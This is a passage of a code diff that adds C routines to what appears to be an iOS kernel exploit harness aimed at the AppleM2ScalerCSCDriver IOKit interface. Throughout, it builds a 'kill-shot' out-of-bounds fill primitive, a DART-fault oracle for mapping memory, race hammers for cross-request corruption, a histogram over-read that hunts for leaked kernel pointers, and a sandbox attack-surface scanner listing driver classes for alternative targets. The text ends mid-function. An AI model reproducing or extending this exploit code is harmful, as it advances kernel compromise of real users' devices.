@@ -25,6 +25,10 @@
 extern kern_return_t set_cf_property_ios(io_registry_entry_t entry,
                                          CFStringRef key, CFTypeRef value)
     __asm("_IORegistryEntrySetCFProperty");
+extern kern_return_t ioconnect_trap1(io_connect_t, uint32_t, uintptr_t)
+    __asm("_IOConnectTrap1");
+extern kern_return_t ioconnect_trap4(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t)
+    __asm("_IOConnectTrap4");
 
 static mach_port_t g_wake, g_notify;
 
@@ -998,6 +1002,1469 @@ static void p_async_cushion(void) {
     LOG("[v26] done (alive)");
 }
 
+
+// V27: what does the kill-shot fill actually overwrite? Scan SRC (both small)
+// after the shot; fill-color content check (0xff vs 0x01 channels).
+static void p_fill_target(void) {
+    LOG("[v27] fill-target analysis");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    // wire both once
+    craft_transform(g_req, si, di, 64, 64);
+    call_struct(1, g_req, 0x1b0, NULL, NULL);
+    usleep(50000);
+
+    // A) fill 0xff, scan src AND dst fully
+    surf_fill_alloc(src, 0x43);
+    surf_fill_alloc(dst, 0x22);
+    killshot(si, di);
+    long f1 = -1;
+    long badS = scan_range(src, 0x43, 0, IOSurfaceGetAllocSize(src), &f1);
+    LOG("[t] A: src changed %ld first 0x%lx", badS, f1);
+    long f2 = -1;
+    long badD = scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &f2);
+    LOG("[t] A: dst changed %ld first 0x%lx", badD, f2);
+    if (badS) {
+        uint32_t seed = 0;
+        IOSurfaceLock(src, kIOSurfaceLockReadOnly, &seed);
+        uint8_t *b = IOSurfaceGetBaseAddress(src);
+        LOG("[t] A: src dump @first: %02x %02x %02x %02x %02x %02x %02x %02x",
+            b[f1], b[f1+1], b[f1+2], b[f1+3], b[f1+4], b[f1+5], b[f1+6], b[f1+7]);
+        IOSurfaceUnlock(src, kIOSurfaceLockReadOnly, &seed);
+    }
+
+    // B) fill color 0x01010101-ish (channels = 1)
+    surf_fill_alloc(src, 0x43);
+    surf_fill_alloc(dst, 0x22);
+    border_payload(g_req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
+    *(uint32_t *)(g_req + 0xbc) = 1;
+    *(uint32_t *)(g_req + 0xc0) = 1;
+    *(uint32_t *)(g_req + 0xc4) = 1;
+    *(uint32_t *)(g_req + 0xc8) = 1;
+    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+    LOG("[t] B: color=1 kill-shot -> kr 0x%08x", kr);
+    usleep(300000);
+    f1 = -1;
+    badS = scan_range(src, 0x43, 0, IOSurfaceGetAllocSize(src), &f1);
+    LOG("[t] B: src changed %ld first 0x%lx", badS, f1);
+    if (badS) {
+        uint32_t seed = 0;
+        IOSurfaceLock(src, kIOSurfaceLockReadOnly, &seed);
+        uint8_t *b = IOSurfaceGetBaseAddress(src);
+        LOG("[t] B: src dump @first: %02x %02x %02x %02x %02x %02x %02x %02x",
+            b[f1], b[f1+1], b[f1+2], b[f1+3], b[f1+4], b[f1+5], b[f1+6], b[f1+7]);
+        IOSurfaceUnlock(src, kIOSurfaceLockReadOnly, &seed);
+    }
+    LOG("[v27] done (alive)");
+}
+
+
+// V28: does the kill-shot fill corrupt the request's internal DMA buffers
+// in an OBSERVABLE way? Compare post-shot transform output vs pre-shot
+// baseline (same input -> same output expected if state is clean).
+static uint64_t dst_checksum(IOSurfaceRef s) {
+    uint32_t seed = 0;
+    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, &seed)) return 0;
+    uint8_t *b = IOSurfaceGetBaseAddress(s);
+    size_t total = IOSurfaceGetBytesPerRow(s) * IOSurfaceGetHeight(s);
+    uint64_t h = 1469598103934665603ULL;
+    for (size_t i = 0; i < total; i++) { h ^= b[i]; h *= 1099511628211ULL; }
+    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, &seed);
+    return h;
+}
+static void p_state_corruption(void) {
+    LOG("[v28] post-shot state corruption check");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    // gradient src
+    {
+        uint32_t seed = 0;
+        IOSurfaceLock(src, 0, &seed);
+        uint8_t *b = IOSurfaceGetBaseAddress(src);
+        for (size_t i = 0; i < IOSurfaceGetBytesPerRow(src) * 64; i++) b[i] = (uint8_t)(i * 7 + 3);
+        IOSurfaceUnlock(src, 0, &seed);
+    }
+    // baseline transforms x3
+    uint64_t base[3];
+    for (int i = 0; i < 3; i++) {
+        surf_fill_alloc(dst, 0x22);
+        craft_transform(g_req, si, di, 64, 64);
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        usleep(100000);
+        base[i] = dst_checksum(dst);
+        LOG("[c] baseline %d kr 0x%08x checksum %016llx", i, kr, base[i]);
+    }
+    // kill-shot
+    killshot(si, di);
+    // post-shot transforms x5
+    for (int i = 0; i < 5; i++) {
+        surf_fill_alloc(dst, 0x22);
+        craft_transform(g_req, si, di, 64, 64);
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        usleep(100000);
+        uint64_t h = dst_checksum(dst);
+        LOG("[c] post %d kr 0x%08x checksum %016llx %s", i, kr, h,
+            (h == base[0]) ? "OK" : "DIFF!");
+        // also try other geometry to stress different tile paths
+        IOSurfaceRef dst2 = make_surface(256, 256);
+        if (dst2) {
+            surf_fill_alloc(dst2, 0x22);
+            craft_transform(g_req, si, IOSurfaceGetID(dst2), 64, 64);
+            *(uint32_t *)(g_req + 0x68) = 256;
+            *(uint32_t *)(g_req + 0x6c) = 256;
+            kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+            usleep(100000);
+            LOG("[c] post %d upscale kr 0x%08x checksum %016llx", i, kr, dst_checksum(dst2));
+            CFRelease(dst2);
+        }
+    }
+    LOG("[v28] done (alive)");
+}
+
+
+// V29: calibration — place fill start INSIDE dst, observe first changed
+// offset, derive the HW start formula empirically.
+static void p_calibrate(void) {
+    LOG("[v29] fill calibration");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    craft_transform(g_req, si, di, 64, 64);
+    call_struct(1, g_req, 0x1b0, NULL, NULL);
+    usleep(50000);
+
+    static const struct {
+        uint32_t rw, rh;            // dst rect (selW, selH)
+        uint32_t bx, by, bw, bh;    // border fields
+        const char *n;
+    } cfgs[] = {
+        { 32, 16, 32, 16, 0xFFFFFFE0, 0xFFFFFFF0, "wrap-start-inside" },
+        { 32, 32,  1,  1, 32, 32, "short-1" },
+        { 32, 32, 16, 16, 32, 32, "short-16" },
+        { 32, 32, 31, 31, 32, 32, "short-31" },
+        { 32, 32,  0, 16,  0, 32, "W0-freeX" },
+    };
+    for (unsigned i = 0; i < sizeof(cfgs)/sizeof(cfgs[0]); i++) {
+        surf_fill_alloc(dst, 0x22);
+        craft_transform(g_req, si, di, 64, 64);
+        *(uint32_t *)(g_req + 0x68) = cfgs[i].rw;   // dst rect w/h
+        *(uint32_t *)(g_req + 0x6c) = cfgs[i].rh;
+        *(uint64_t *)(g_req + 0x20) |= (1ULL << 28);
+        *(uint32_t *)(g_req + 0xac) = cfgs[i].bx;
+        *(uint32_t *)(g_req + 0xb0) = cfgs[i].by;
+        *(uint32_t *)(g_req + 0xb4) = cfgs[i].bw;
+        *(uint32_t *)(g_req + 0xb8) = cfgs[i].bh;
+        *(uint32_t *)(g_req + 0xbc) = 0xff;
+        *(uint32_t *)(g_req + 0xc0) = 0xff;
+        *(uint32_t *)(g_req + 0xc4) = 0xff;
+        *(uint32_t *)(g_req + 0xc8) = 0xff;
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        usleep(300000);
+        long first = -1;
+        long bad = scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first);
+        LOG("[k] %s -> kr 0x%08x, dst changed %ld, first 0x%lx", cfgs[i].n, kr, bad, first);
+        if (bad && first >= 0) {
+            uint32_t seed = 0;
+            IOSurfaceLock(dst, kIOSurfaceLockReadOnly, &seed);
+            uint8_t *b = IOSurfaceGetBaseAddress(dst);
+            LOG("[k] %s dump @first: %02x %02x %02x %02x %02x %02x %02x %02x",
+                cfgs[i].n, b[first], b[first+1], b[first+2], b[first+3],
+                b[first+4], b[first+5], b[first+6], b[first+7]);
+            IOSurfaceUnlock(dst, kIOSurfaceLockReadOnly, &seed);
+        }
+    }
+    LOG("[v29] done (alive)");
+}
+
+
+// V30: rotation allocates the NC (neighbor channel) buffer above src in the
+// same request. Kill-shot fill should overwrite NC mid-frame; the 2nd pass
+// then writes NC-derived garbage into dst -> observable in dst scan.
+static void p_nc(void) {
+    LOG("[v30] NC-corruption observability");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    // gradient src for traceable output
+    uint32_t seed = 0;
+    IOSurfaceLock(src, 0, &seed);
+    uint8_t *b = IOSurfaceGetBaseAddress(src);
+    for (size_t i = 0; i < IOSurfaceGetBytesPerRow(src) * 64; i++) b[i] = (uint8_t)(i * 5 + 1);
+    IOSurfaceUnlock(src, 0, &seed);
+
+    for (uint32_t t = 0; t < 4; t++) {
+        // baseline rotated transform (no border)
+        surf_fill_alloc(dst, 0x22);
+        craft_transform(g_req, si, di, 64, 64);
+        *(uint64_t *)(g_req + 0x20) &= ~0xFULL;
+        *(uint64_t *)(g_req + 0x20) |= t;
+        kern_return_t kr0 = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        usleep(100000);
+        uint64_t h0 = dst_checksum(dst);
+        // kill-shot with same rotation
+        surf_fill_alloc(dst, 0x22);
+        border_payload(g_req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
+        *(uint64_t *)(g_req + 0x20) &= ~0xFULL;
+        *(uint64_t *)(g_req + 0x20) |= t;
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        usleep(300000);
+        long first = -1;
+        long bad = scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first);
+        LOG("[nc] t=%u baseline kr 0x%08x h %016llx | shot kr 0x%08x, dst changed %ld first 0x%lx",
+            t, kr0, h0, kr, bad, first);
+    }
+    LOG("[v30] done (alive)");
+}
+
+
+// V31a: triangulate the fill start address. Tall dst (64x256), wrapped H,
+// varying bfY -> first changed row reveals the start formula.
+static void p_triangulate(void) {
+    LOG("[v31a] start triangulation (tall dst)");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 256);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    LOG("[tr] dst 64x256 bpr %zu alloc 0x%zx", IOSurfaceGetBytesPerRow(dst), IOSurfaceGetAllocSize(dst));
+    craft_transform(g_req, si, di, 64, 64);
+    call_struct(1, g_req, 0x1b0, NULL, NULL);
+    usleep(50000);
+    static const uint32_t bfs[][2] = { {32, 0xFFFFFFE0}, {64, 0xFFFFFFE0}, {96, 0xFFFFFFE0} };
+    for (unsigned i = 0; i < 3; i++) {
+        surf_fill_alloc(dst, 0x22);
+        border_payload(g_req, si, di, 32, bfs[i][0], 0xFFFFFFE0, bfs[i][1], 32, 32);
+        // fix: border_payload sets X,Y,W,H order (x,y,w,h) = (32, bfs[i][0], ffe0, bfs[i][1])
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        usleep(300000);
+        long first = -1;
+        long bad = scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first);
+        LOG("[tr] bfY=%u -> kr 0x%08x, changed %ld, first 0x%lx (row %ld col-byte %ld)",
+            bfs[i][0], kr, bad, first, first >= 0 ? first / 256 : -1, first >= 0 ? first % 256 : -1);
+    }
+    LOG("[v31a] done");
+}
+
+// V31b: cross-request contamination race. T2 (this thread after shots):
+// verify big-transform checksums while T1 hammers kill-shots.
+static volatile int g_shot_stop;
+static void *t_killhammer(void *arg) {
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return NULL;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    uint8_t *req = must_map(0x1000);
+    while (!g_shot_stop) {
+        border_payload(req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
+        IOConnectCallMethod(g_conn, 1, NULL, 0, req, 0x1b0, NULL, NULL, NULL, NULL);
+        usleep(2000);
+    }
+    return NULL;
+}
+static void p_cross_race(int seconds) {
+    LOG("[v31b] cross-request race %ds", seconds);
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(1024, 1024);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    // fixed src pattern
+    uint32_t seed = 0;
+    IOSurfaceLock(src, 0, &seed);
+    uint8_t *b = IOSurfaceGetBaseAddress(src);
+    for (size_t i = 0; i < IOSurfaceGetBytesPerRow(src) * 64; i++) b[i] = (uint8_t)(i * 3 + 7);
+    IOSurfaceUnlock(src, 0, &seed);
+    // expected checksum
+    craft_transform(g_req, si, di, 64, 64);
+    *(uint32_t *)(g_req + 0x68) = 1024;
+    *(uint32_t *)(g_req + 0x6c) = 1024;
+    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+    usleep(200000);
+    uint64_t expect = dst_checksum(dst);
+    LOG("[cr] expected checksum %016llx (kr 0x%08x)", expect, kr);
+
+    g_shot_stop = 0;
+    pthread_t th;
+    pthread_create(&th, NULL, t_killhammer, NULL);
+    long iter = 0, corrupt = 0;
+    time_t t0 = time(NULL);
+    while (time(NULL) - t0 < seconds) {
+        craft_transform(g_req, si, di, 64, 64);
+        *(uint32_t *)(g_req + 0x68) = 1024;
+        *(uint32_t *)(g_req + 0x6c) = 1024;
+        kern_return_t k2 = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        uint64_t h = dst_checksum(dst);
+        iter++;
+        if (h != expect || k2 != 0) {
+            LOG("[cr] iter %ld: kr 0x%08x checksum %016llx MISMATCH", iter, k2, h);
+            corrupt++;
+        }
+        usleep(1000);
+    }
+    g_shot_stop = 1;
+    pthread_join(th, NULL);
+    LOG("[cr] %ld iters, %ld corrupted", iter, corrupt);
+    LOG("[v31b] done (alive)");
+}
+
+
+// V32: read the driver's own DART-fault classification via GetDiag (sel 8)
+// before/after kill-shot. trackDartError_gated classifies the fault DVA
+// ("Dart Error req %d, %s plane %d", RegStream/NC/Spill) into log_activity.
+static void p_diag_dart(void) {
+    LOG("[v32] diag dart-error capture");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    size_t bufsz = 0x10000;
+    uint8_t *before = must_map(bufsz), *after = must_map(bufsz);
+
+    memset(before, 0, bufsz);
+    *(uint32_t *)before = 0x6944506b;
+    uint64_t va = (uint64_t)(uintptr_t)before;
+    call_struct(8, &va, 8, NULL, NULL);
+
+    killshot(si, di);
+    usleep(200000);
+
+    memset(after, 0, bufsz);
+    *(uint32_t *)after = 0x6944506b;
+    va = (uint64_t)(uintptr_t)after;
+    call_struct(8, &va, 8, NULL, NULL);
+
+    // diff: print records present in after but not before
+    for (size_t i = 0; i + 16 <= bufsz; i += 8) {
+        uint64_t a = *(uint64_t *)(after + i);
+        uint64_t b = *(uint64_t *)(before + i);
+        if (a != b) {
+            LOG("[dd] +0x%04zx: %016llx -> %016llx", i, b, a);
+        }
+    }
+    LOG("[v32] done (alive)");
+}
+
+
+// V33: fault-oracle memory mapping. bfW=0 disables X-axis validation;
+// bfX (17-bit register write) positions the fill start. Sweep bfX/bfY:
+// kr 0 = write landed in mapped memory; 0x2d6 = DART fault (unmapped).
+static void p_oracle(void) {
+    LOG("[v33] fault-oracle mapping");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    craft_transform(g_req, si, di, 64, 64);
+    call_struct(1, g_req, 0x1b0, NULL, NULL);
+    usleep(50000);
+
+    // coarse bfX sweep, bfY=16 bfW=0 bfH=32 (known kr 0 config)
+    for (uint32_t bx = 0; bx <= 0x1ffc0; bx += 0x1000) {
+        surf_fill_alloc(dst, 0x22);
+        border_payload(g_req, si, di, bx, 16, 0, 32, 32, 32);
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        long first = -1;
+        long bad = (kr == 0) ? scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first) : -1;
+        LOG("[or] bfX 0x%05x -> kr 0x%08x changed %ld first 0x%lx", bx, kr, bad, first);
+        usleep(50000);
+    }
+    // bfY sweep at bfX=0
+    for (uint32_t by = 0; by <= 0x1ffc0; by += 0x800) {
+        surf_fill_alloc(dst, 0x22);
+        border_payload(g_req, si, di, 0, by, 0, 32, 32, 32);
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        long first = -1;
+        long bad = (kr == 0) ? scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first) : -1;
+        LOG("[or] bfY 0x%05x -> kr 0x%08x changed %ld first 0x%lx", by, kr, bad, first);
+        usleep(50000);
+    }
+    LOG("[v33] done (alive)");
+}
+
+
+// V34: fixed cross-request race. T2: valid DOWNSCALE 1024->64 (checksum-verified
+// every iter). T1: kill-shot hammer on a separate connection. If T1's fill
+// ever lands in T2's mapped buffers, T2's output changes.
+static void *t_killhammer2(void *arg) {
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) { LOG("[cr2] hammer open failed"); return NULL; }
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return NULL;
+    uint8_t *req = must_map(0x1000);
+    while (!g_shot_stop) {
+        border_payload(req, IOSurfaceGetID(src), IOSurfaceGetID(dst),
+                       32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
+        IOConnectCallMethod(c, 1, NULL, 0, req, 0x1b0, NULL, NULL, NULL, NULL);
+        usleep(1000);
+    }
+    return NULL;
+}
+static void p_cross_race2(int seconds) {
+    LOG("[v34] cross-request race v2 %ds", seconds);
+    IOSurfaceRef srcBig = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(256, 256);
+    if (!srcBig || !dst) { LOG("[cr2] surface fail"); return; }
+    // fixed src pattern
+    uint32_t seed = 0;
+    IOSurfaceLock(srcBig, 0, &seed);
+    uint8_t *b = IOSurfaceGetBaseAddress(srcBig);
+    size_t tot = IOSurfaceGetBytesPerRow(srcBig) * 64;
+    for (size_t i = 0; i < tot; i++) b[i] = (uint8_t)(i * 3 + 7);
+    IOSurfaceUnlock(srcBig, 0, &seed);
+    // working downscale: crop full 1024 src -> 64 dst
+    craft_transform(g_req, IOSurfaceGetID(srcBig), IOSurfaceGetID(dst), 64, 64);
+    *(uint32_t *)(g_req + 0x68) = 256;             // dst rect 256 (4x upscale, known-good)
+    *(uint32_t *)(g_req + 0x6c) = 256;
+    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+    usleep(200000);
+    uint64_t expect = dst_checksum(dst);
+    LOG("[cr2] baseline kr 0x%08x expect %016llx", kr, expect);
+    if (kr) { LOG("[cr2] baseline broken, abort"); return; }
+
+    g_shot_stop = 0;
+    pthread_t th;
+    pthread_create(&th, NULL, t_killhammer2, NULL);
+    long iter = 0, corrupt = 0;
+    time_t t0 = time(NULL);
+    while (time(NULL) - t0 < seconds) {
+        surf_fill_alloc(dst, 0x22);
+        craft_transform(g_req, IOSurfaceGetID(srcBig), IOSurfaceGetID(dst), 64, 64);
+        *(uint32_t *)(g_req + 0x68) = 256;
+        *(uint32_t *)(g_req + 0x6c) = 256;
+        kern_return_t k2 = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        uint64_t h = dst_checksum(dst);
+        iter++;
+        if (h != expect || k2 != 0) {
+            LOG("[cr2] iter %ld: kr 0x%08x checksum %016llx MISMATCH (expect %016llx)",
+                iter, k2, h, expect);
+            corrupt++;
+        }
+        usleep(500);
+    }
+    g_shot_stop = 1;
+    pthread_join(th, NULL);
+    LOG("[cr2] %ld iters, %ld corrupted", iter, corrupt);
+    LOG("[v34] done (alive)");
+}
+
+
+// V35: SetCustomFilter path. sel 4 takes {6 x u32 != 0, u64 userspace VA of
+// coeffs}. Framework constants: type<=7 -> a1=a4=(0x40000-(type<<15))>>3,
+// a2=4, a3=0x10, a5=8, a6=0x10. Probe acceptance, then oversized dims hoping
+// the kernel over-reads our coeff buffer into scaler math (measurable in dst).
+static void p_filter(void) {
+    LOG("[v35] SetCustomFilter probes");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    uint8_t *coef = must_map(0x10000);
+    for (int i = 0; i < 0x10000; i++) coef[i] = (uint8_t)(i >> 4);
+
+    // (a) framework-derived constants for each filter type
+    for (uint32_t type = 0; type <= 7; type++) {
+        struct { uint32_t a1,a2,a3,a4,a5,a6; uint64_t va; } cf = {
+            (0x40000 - (type << 15)) >> 3, 4, 0x10,
+            (0x40000 - (type << 15)) >> 3, 8, 0x10,
+            (uint64_t)(uintptr_t)coef };
+        kern_return_t kr = call_struct(4, &cf, 0x20, NULL, NULL);
+        LOG("[flt] type %u a1 %05x -> kr 0x%08x", type, cf.a1, kr);
+    }
+    // (b) small sanity set
+    static const uint32_t combos[][6] = {
+        {1,1,1,1,1,1}, {4,4,0x10,4,8,0x10}, {0x100,4,0x10,0x100,8,0x10},
+        {0x7000,4,0x10,0x7000,8,0x10}, {0xffff,0xff,0xff,0xffff,0xff,0xff},
+    };
+    for (unsigned i = 0; i < sizeof(combos)/sizeof(combos[0]); i++) {
+        struct { uint32_t a1,a2,a3,a4,a5,a6; uint64_t va; } cf = {
+            combos[i][0], combos[i][1], combos[i][2],
+            combos[i][3], combos[i][4], combos[i][5],
+            (uint64_t)(uintptr_t)coef };
+        kern_return_t kr = call_struct(4, &cf, 0x20, NULL, NULL);
+        LOG("[flt] combo %u {%x %x %x %x %x %x} -> kr 0x%08x", i,
+            cf.a1, cf.a2, cf.a3, cf.a4, cf.a5, cf.a6, kr);
+    }
+    // (c) accepted config -> transform with CustomFilter flag (bit 6),
+    // compare dst checksums across runs with different heap neighbors
+    struct { uint32_t a1,a2,a3,a4,a5,a6; uint64_t va; } good = {
+        0x7000, 4, 0x10, 0x7000, 8, 0x10, (uint64_t)(uintptr_t)coef };
+    kern_return_t kset = call_struct(4, &good, 0x20, NULL, NULL);
+    LOG("[flt] set for transform -> kr 0x%08x", kset);
+    for (int i = 0; i < 4; i++) {
+        surf_fill_alloc(dst, 0x22);
+        craft_transform(g_req, si, di, 64, 64);
+        *(uint64_t *)(g_req + 0x20) |= (1ULL << 6);   // CustomFilter
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        usleep(100000);
+        LOG("[flt] transform+customfilter %d -> kr 0x%08x checksum %016llx",
+            i, kr, dst_checksum(dst));
+    }
+    LOG("[v35] done (alive)");
+}
+
+
+// V36: histogram path. Transform with histogram options (bit 29, bin mode,
+// region, pixel bins) may resize client+0x148 (GetHistogram copy length).
+// Measure how much GetHistogram actually writes into a big 0xAA buffer and
+// scan for kernel-pointer patterns (OOB-read infoleak).
+static long hist_measure(uint8_t *buf, size_t bufsz, int scan_ptrs) {
+    memset(buf, 0xAA, bufsz);
+    *(uint32_t *)buf = 0;                        // no magic needed for sel 7
+    uint64_t va = (uint64_t)(uintptr_t)buf;
+    kern_return_t kr = call_struct(7, &va, 8, NULL, NULL);
+    long written = 0;
+    for (size_t i = 0; i < bufsz; i++) if (buf[i] != 0xAA) written++;
+    LOG("[hg] GetHistogram -> kr 0x%08x, written(bytes != 0xAA) %ld", kr, written);
+    if (scan_ptrs) {
+        int found = 0;
+        for (size_t i = 0; i + 8 <= bufsz && found < 16; i += 4) {
+            uint64_t v = *(uint64_t *)(buf + i);
+            if ((v >> 40) == 0xfffffe || (v >> 40) == 0xffffff || (v >> 40) == 0xfffffd ||
+                (v >> 40) == 0xfffff0) {
+                LOG("[hg] ptr-like @+0x%zx: %016llx", i, v);
+                found++;
+            }
+        }
+        if (!found) LOG("[hg] no ptr-like qwords");
+    }
+    return written;
+}
+static void p_histogram(void) {
+    LOG("[v36] histogram path probes");
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef dst = make_surface(64, 64);
+    if (!src || !dst) return;
+    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
+    size_t bufsz = 0x10000;
+    uint8_t *hbuf = must_map(bufsz);
+
+    LOG("[hg] baseline (no histogram transform):");
+    hist_measure(hbuf, bufsz, 1);
+
+    // transforms with histogram options, increasing ambition
+    static const struct { uint32_t binmode, offx, offy, w, h; const char *n; } hc[] = {
+        { 1, 0, 0, 64, 64, "binmode1-region64" },
+        { 2, 0, 0, 64, 64, "binmode2-8bins" },
+        { 1, 0, 0, 4096, 4096, "binmode1-region4096" },
+        { 2, 0, 0, 0xffff, 0xffff, "binmode2-region64k" },
+    };
+    for (unsigned i = 0; i < sizeof(hc)/sizeof(hc[0]); i++) {
+        craft_transform(g_req, si, di, 64, 64);
+        *(uint64_t *)(g_req + 0x20) |= (1ULL << 29);       // HistogramBinMode present
+        *(uint32_t *)(g_req + 0xdc) = hc[i].binmode;
+        *(uint32_t *)(g_req + 0xe0) = hc[i].offx;
+        *(uint32_t *)(g_req + 0xe4) = hc[i].offy;
+        *(uint32_t *)(g_req + 0xe8) = hc[i].w;
+        *(uint32_t *)(g_req + 0xec) = hc[i].h;
+        for (int b = 0; b < 8; b++)
+            *(uint32_t *)(g_req + 0xf0 + b * 4) = 0x100 * (b + 1);   // pixel bins
+        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
+        LOG("[hg] transform %s -> kr 0x%08x", hc[i].n, kr);
+        usleep(100000);
+        hist_measure(hbuf, bufsz, 1);
+    }
+    LOG("[v36] done (alive)");
+}
+
+
+// V37: attack-surface scan — which IOService classes are openable from the
+// app sandbox (no entitlements). Guides plan-B target selection.
+static void p_surface_scan(void) {
+    LOG("[v37] IOService open scan");
+    static const char *names[] = {
+        // new in 27.0 (kext diff)
+        "VCPDRMService", "VCPDRMServiceUserClient", "AppleImage4", "Image4",
+        "AppleEncryptedArchive", "AFKHIDTBDevice",
+        // GPU / media / classic surfaces
+        "IOGPU", "AGXDevice", "AGXDeviceUserClient", "IOGPUDevice",
+        "AppleH16ANEInterface", "ANEDevice", "AppleANE", "NeuralEngine",
+        "AppleAVD", "AppleAVE2", "AppleJPEGDriver", "AppleProRes",
+        "AppleMobileFramebuffer", "IOMobileFramebufferAP", "AppleDisplayPipe",
+        "AppleDPAF", "AppleDPDevice", "AppleCDM", "AppleFairPlayIOKit",
+        "AppleCredentialManager", "AppleSEPManager", "AppleSSE",
+        "IOAudio2Device", "AppleSPU", "AppleSMC", "ApplePMGR",
+        "AppleNVMeController", "AppleEmbeddedNVMeController",
+        "AppleUSBHostController", "AppleT8132USBXHCI",
+        "AppleConvergedIPCDevice", "AFKSharedMemoryResource",
+        "IOSurfaceRoot", "IOSurface", "AppleM2ScalerCSCDriver",
+        "AppleM2ScalerParavirtDriver",
+        "AppleH16CameraInterface", "AppleH13CamIn", "AppleCameraInterface",
+        "AppleBaseband", "AppleBCMWLANCore", "AppleWiFi",
+        "AppleS5L8960XUSBArbitrator", "AppleAuthCP", "AppleKeyStore",
+        "AppleARMWatchdogTimer", "AppleSART", "ApplePMU",
+        NULL
+    };
+    for (int i = 0; names[i]; i++) {
+        CFMutableDictionaryRef m = IOServiceMatching(names[i]);
+        if (!m) continue;
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
+        if (!svc) { LOG("[sc] %-32s NOT FOUND", names[i]); continue; }
+        for (uint32_t type = 0; type <= 3; type++) {
+            io_connect_t c = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
+            if (!kr && c) {
+                LOG("[sc] %-32s OPEN OK type %u conn 0x%x", names[i], type, c);
+                IOServiceClose(c);
+            } else if (type == 0) {
+                LOG("[sc] %-32s exists, open -> 0x%08x", names[i], kr);
+            }
+        }
+        IOObjectRelease(svc);
+    }
+    LOG("[v37] done");
+}
+
+
+// V38: generic userclient method-table prober for plan-B targets.
+static void probe_client(const char *svc_name, uint32_t type) {
+    io_connect_t c = open_service(svc_name, type);
+    if (!c) { LOG("[mp] %s/%u: open failed", svc_name, type); return; }
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x2000);
+    memset(in, 0, 0x2000);
+    int live = 0;
+    for (uint32_t sel = 0; sel < 40; sel++) {
+        // scalar probe
+        uint64_t sv[4] = {0,0,0,0}; uint32_t sc = 4;
